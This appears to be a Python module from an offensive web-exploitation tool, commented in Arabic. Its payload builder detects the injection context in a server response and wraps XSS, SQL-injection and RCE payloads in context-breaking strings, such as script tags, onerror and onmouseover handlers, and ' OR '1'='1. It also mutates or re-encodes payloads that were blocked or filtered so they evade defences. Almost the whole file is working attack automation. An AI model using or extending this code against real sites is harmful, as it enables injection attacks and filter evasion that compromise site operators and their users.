
import re
import random
import string
from typing import Dict, List, Optional, Any, Set, Tuple
from dataclasses import dataclass, field
from enum import Enum

from .payload_generator import Payload, PayloadType, EncodingType, get_payload_generator
from .payload_mutator import get_payload_mutator
from .payload_encoder import get_payload_encoder

import logging

logger = logging.getLogger(__name__)


class ContextType(Enum):
    """نوع السياق"""
    HTML = "html"
    HTML_ATTRIBUTE = "html_attribute"
    HTML_COMMENT = "html_comment"
    JAVASCRIPT_STRING = "javascript_string"
    JAVASCRIPT_TEMPLATE = "javascript_template"
    CSS = "css"
    URL = "url"
    JSON = "json"
    XML = "xml"
    SQL_STRING = "sql_string"
    SQL_IDENTIFIER = "sql_identifier"
    LDAP_FILTER = "ldap_filter"
    XPATH = "xpath"


@dataclass
class ContextAnalysis:
    """تحليل السياق"""
    context_type: ContextType
    quotes_type: Optional[str] = None  # single, double, backtick
    encoding_detected: Optional[str] = None
    special_chars: List[str] = field(default_factory=list)
    escape_char: Optional[str] = None
    is_inside_tag: bool = False
    attributes: Dict[str, str] = field(default_factory=dict)
    confidence: float = 0.0


@dataclass
class ContextualPayload:
    """حمولة مخصصة للسياق"""
    original: Payload
    contextualized: str
    context_type: ContextType
    modifications: List[str]
    expected_impact: float  # 0-1


class ContextPayloadBuilder:
    """
    بناء الحمولات حسب السياق المتقدم
    
    الميزات:
    - تحليل سياق الهدف (HTML, JavaScript, SQL, إلخ)
    - بناء حمولات مخصصة لكل سياق
    - اختراق علامات الاقتباس والهروب
    - تقنيات خروج من السياق (Context Breaking)
    - تحوير الحمولات حسب الاستجابة
    """
    
    # أنماط كشف السياق
    CONTEXT_PATTERNS = {
        ContextType.HTML: [
            r'<[^>]*>',
            r'&[a-z]+;',
        ],
        ContextType.HTML_ATTRIBUTE: [
            r'=\s*["\']([^"\']*)["\']',
            r'=\s*([^\s>]+)',
        ],
        ContextType.JAVASCRIPT_STRING: [
            r'["\']([^"\'\\]*(?:\\.[^"\'\\]*)*)["\']',
        ],
        ContextType.URL: [
            r'[?&][^=]+=[^&]*',
        ],
        ContextType.JSON: [
            r'"[^"]+"\s*:\s*"[^"]*"',
        ],
    }
    
    # تقنيات الخروج من السياق
    CONTEXT_BREAKERS = {
        ContextType.HTML: [
            "><script>PAYLOAD</script>",
            "></tag><script>PAYLOAD</script>",
            "><img src=x onerror=PAYLOAD>",
        ],
        ContextType.HTML_ATTRIBUTE: [
            '"><script>PAYLOAD</script>',
            '" onmouseover=PAYLOAD "',
            '" autofocus onfocus=PAYLOAD "',
        ],
        ContextType.JAVASCRIPT_STRING: [
            '"; PAYLOAD;//',
            '${PAYLOAD}',
            '\\"; PAYLOAD;//',
        ],
        ContextType.JAVASCRIPT_TEMPLATE: [
            '${PAYLOAD}',
            '${PAYLOAD}//',
        ],
        ContextType.SQL_STRING: [
            "' OR '1'='1",
            "'; PAYLOAD--",
            "\" OR \"1\"=\"1",
        ],
    }
    
    def __init__(self):
        self._generator = get_payload_generator()
        self._mutator = get_payload_mutator()
        self._encoder = get_payload_encoder()
        
        logger.info("ContextPayloadBuilder initialized")
    
    def analyze_context(self, response_body: str, injection_point: str) -> ContextAnalysis:
        """
        تحليل السياق حول نقطة الحقن
        
        Args:
            response_body: نص الاستجابة
            injection_point: نقطة الحقن (المعامل أو الموقع)
        
        Returns:
            تحليل السياق
        """
        context = ContextAnalysis(context_type=ContextType.HTML, confidence=0.5)
        
        # البحث عن موقع الحقن في الاستجابة
        surrounding = self._get_surrounding_text(response_body, injection_point, 100)
        
        # التحقق من وجود في HTML attribute
        attr_match = re.search(r'=\s*["\']([^"\']*%s[^"\']*)["\']' % re.escape(injection_point), surrounding, re.I)
        if attr_match:
            context.context_type = ContextType.HTML_ATTRIBUTE
            context.quotes_type = '"' if '"' in attr_match.group(0) else "'"
            context.confidence = 0.8
        
        # التحقق من وجود في JavaScript string
        js_match = re.search(r'["\']([^"\'\\]*(?:\\.[^"\'\\]*)*%s[^"\'\\]*)["\']' % re.escape(injection_point), surrounding)
        if js_match:
            context.context_type = ContextType.JAVASCRIPT_STRING
            context.quotes_type = '"' if '"' in js_match.group(0) else "'"
            context.escape_char = '\\'
            context.confidence = 0.85
        
        # التحقق من وجود في URL
        url_match = re.search(r'[?&][^=]+=' + re.escape(injection_point), surrounding)
        if url_match:
            context.context_type = ContextType.URL
            context.confidence = 0.75
        
        # التحقق من وجود في JSON
        json_match = re.search(r'"[^"]+"\s*:\s*"[^"]*%s[^"]*"' % re.escape(injection_point), surrounding)
        if json_match:
            context.context_type = ContextType.JSON
            context.confidence = 0.8
        
        # التحقق من وجود في SQL
        sql_match = re.search(r'[\'"]\s*%s\s*[\'"]' % re.escape(injection_point), surrounding)
        if sql_match:
            context.context_type = ContextType.SQL_STRING
            context.quotes_type = "'" if "'" in sql_match.group(0) else '"'
            context.confidence = 0.9
        
        # استخراج الأحرف الخاصة المحيطة
        context.special_chars = self._extract_special_chars(surrounding)
        
        return context
    
    def build_contextual_payload(
        self,
        base_payload: Payload,
        context: ContextAnalysis,
        include_breakers: bool = True
    ) -> List[ContextualPayload]:
        """
        بناء حمولة مخصصة حسب السياق
        
        Args:
            base_payload: الحمولة الأساسية
            context: تحليل السياق
            include_breakers: تضمين تقنيات الخروج من السياق
        
        Returns:
            قائمة بالحمولات المخصصة
        """
        contextual_payloads = []
        
        # 1. حمولة أساسية في السياق الحالي
        contextualized = self._adapt_to_context(base_payload.payload, context)
        contextual_payloads.append(ContextualPayload(
            original=base_payload,
            contextualized=contextualized,
            context_type=context.context_type,
            modifications=["context_adaptation"],
            expected_impact=0.5
        ))
        
        # 2. إضافة تقنيات الخروج من السياق
        if include_breakers and context.context_type in self.CONTEXT_BREAKERS:
            for breaker in self.CONTEXT_BREAKERS[context.context_type][:3]:
                contextualized = breaker.replace("PAYLOAD", base_payload.payload)
                contextual_payloads.append(ContextualPayload(
                    original=base_payload,
                    contextualized=contextualized,
                    context_type=context.context_type,
                    modifications=["context_breaker"],
                    expected_impact=0.7
                ))
        
        # 3. إضافة ترميزات خاصة للسياق
        if context.context_type == ContextType.HTML_ATTRIBUTE:
            # ترميز HTML في السمات
            encoded = base_payload.payload.replace('"', '&quot;').replace("'", "&#39;")
            contextual_payloads.append(ContextualPayload(
                original=base_payload,
                contextualized=encoded,
                context_type=context.context_type,
                modifications=["html_encoding"],
                expected_impact=0.4
            ))
        
        elif context.context_type == ContextType.JAVASCRIPT_STRING:
            # هروب من JavaScript string
            escaped = base_payload.payload.replace('\\', '\\\\').replace('"', '\\"').replace("'", "\\'")
            contextual_payloads.append(ContextualPayload(
                original=base_payload,
                contextualized=escaped,
                context_type=context.context_type,
                modifications=["javascript_escape"],
                expected_impact=0.6
            ))
        
        elif context.context_type == ContextType.URL:
            # ترميز URL
            import urllib.parse
            encoded = urllib.parse.quote(base_payload.payload)
            contextual_payloads.append(ContextualPayload(
                original=base_payload,
                contextualized=encoded,
                context_type=context.context_type,
                modifications=["url_encoding"],
                expected_impact=0.5
            ))
        
        # 4. إضافة حمولة مع علامات الاقتباس المناسبة
        if context.quotes_type:
            quoted = f"{context.quotes_type}{base_payload.payload}{context.quotes_type}"
            contextual_payloads.append(ContextualPayload(
                original=base_payload,
                contextualized=quoted,
                context_type=context.context_type,
                modifications=["quoting"],
                expected_impact=0.3
            ))
        
        # ترتيب حسب التأثير المتوقع
        contextual_payloads.sort(key=lambda x: x.expected_impact, reverse=True)
        
        return contextual_payloads
    
    def _adapt_to_context(self, payload: str, context: ContextAnalysis) -> str:
        """تكييف الحمولة للسياق"""
        
        if context.context_type == ContextType.HTML_ATTRIBUTE:
            # في سمات HTML، لا تحتاج إلى < و >
            adapted = payload.replace("<", "").replace(">", "")
            return adapted
        
        elif context.context_type == ContextType.JAVASCRIPT_STRING:
            # في JavaScript strings، تغيير وظيفة التنبيه
            adapted = payload.replace("alert", "console.log").replace("alert(", "eval(")
            return adapted
        
        elif context.context_type == ContextType.URL:
            # في URL، ترميز الحمولة
            import urllib.parse
            return urllib.parse.quote(payload)
        
        return payload
    
    def _get_surrounding_text(self, text: str, injection_point: str, radius: int) -> str:
        """الحصول على النص المحيط بنقطة الحقن"""
        index = text.find(injection_point)
        if index == -1:
            return text[:radius]
        
        start = max(0, index - radius)
        end = min(len(text), index + len(injection_point) + radius)
        
        return text[start:end]
    
    def _extract_special_chars(self, text: str) -> List[str]:
        """استخراج الأحرف الخاصة من النص"""
        special = set()
        special_chars = ['<', '>', '"', "'", '=', ';', '(', ')', '{', '}', '[', ']', '&', '|', '`', '$', '#', '@']
        
        for char in special_chars:
            if char in text:
                special.add(char)
        
        return list(special)
    
    async def generate_payloads_for_context(
        self,
        context: ContextAnalysis,
        payload_type: PayloadType = PayloadType.XSS,
        limit: int = 20
    ) -> List[ContextualPayload]:
        """
        توليد حمولات مخصصة لسياق معين
        
        Args:
            context: تحليل السياق
            payload_type: نوع الحمولة المطلوبة
            limit: الحد الأقصى للحمولات
        
        Returns:
            قائمة بالحمولات المخصصة
        """
        # توليد حمولات أساسية
        if payload_type == PayloadType.XSS:
            base_payloads = self._generator.generate_xss_payloads(max_payloads=limit)
        elif payload_type == PayloadType.SQLI:
            base_payloads = self._generator.generate_sqli_payloads(max_payloads=limit)
        elif payload_type == PayloadType.RCE:
            base_payloads = self._generator.generate_rce_payloads(max_payloads=limit)
        else:
            base_payloads = self._generator.generate_random_payloads(payload_type, count=limit)
        
        all_contextual = []
        
        for base in base_payloads[:limit]:
            contextual = self.build_contextual_payload(base, context)
            all_contextual.extend(contextual)
        
        return all_contextual[:limit]
    
    async def test_and_refine(
        self,
        payload: Payload,
        context: ContextAnalysis,
        response: str,
        success: bool
    ) -> Optional[Payload]:
        """
        اختبار وتحسين الحمولة بناءً على الاستجابة
        
        Args:
            payload: الحمولة المختبرة
            context: تحليل السياق
            response: استجابة الخادم
            success: هل نجحت الحمولة؟
        
        Returns:
            حمولة محسنة أو None
        """
        if success:
            logger.debug(f"Payload {payload.id} succeeded, no refinement needed")
            return None
        
        # تحليل سبب الفشل
        error_indicators = {
            "encoding": ["encoding", "invalid", "malformed"],
            "blocked": ["blocked", "forbidden", "denied"],
            "filtered": ["filtered", "removed", "sanitized"],
            "truncated": ["truncated", "limit", "too long"],
        }
        
        failure_reason = None
        response_lower = response.lower()
        
        for reason, indicators in error_indicators.items():
            for indicator in indicators:
                if indicator in response_lower:
                    failure_reason = reason
                    break
            if failure_reason:
                break
        
        if not failure_reason:
            return None
        
        # تحسين الحمولة حسب سبب الفشل
        improved_payload = payload
        
        if failure_reason == "encoding":
            # تجربة ترميز مختلف
            encoded = self._encoder.encode_payload(payload, "double_url")
            if encoded:
                improved_payload = Payload(
                    id=f"{payload.id}_improved",
                    name=f"{payload.name} (Improved)",
                    type=payload.type,
                    payload=encoded.encoded,
                    encoding=EncodingType.DOUBLE_URL,
                    description=f"Improved version with double URL encoding",
                    tags=payload.tags + ["improved", "double_encoded"]
                )
        
        elif failure_reason == "blocked":
            # استخدام تقنيات تجاوز إضافية
            mutated = self._mutator.mutate_payload(payload)[:1]
            if mutated:
                improved_payload = mutated[0].mutated
        
        elif failure_reason == "filtered":
            # إضافة تعليقات أو تغيير حالة الأحرف
            mutated = self._mutator._case_swap(payload)
            if mutated:
                improved_payload = mutated
        
        elif failure_reason == "truncated":
            # تقصير الحمولة
            shorter = payload.payload[:100] + "..."
            improved_payload = Payload(
                id=f"{payload.id}_shorter",
                name=f"{payload.name} (Shorter)",
                type=payload.type,
                payload=shorter,
                encoding=payload.encoding,
                description=f"Shortened version",
                tags=payload.tags + ["shortened"]
            )
        
        return improved_payload
    
    def get_statistics(self) -> Dict:
        """إحصائيات الباني"""
        return {
            "supported_contexts": [c.value for c in ContextType],
            "context_breakers": {c.value: len(patterns) for c, patterns in self.CONTEXT_BREAKERS.items()},
            "context_patterns": {c.value: len(patterns) for c, patterns in self.CONTEXT_PATTERNS.items()}
        }


# نسخة عالمية
_default_builder = None


def get_context_payload_builder() -> ContextPayloadBuilder:
    """الحصول على نسخة عالمية من باني الحمولات حسب السياق"""
    global _default_builder
    if _default_builder is None:
        _default_builder = ContextPayloadBuilder()
    return _default_builder

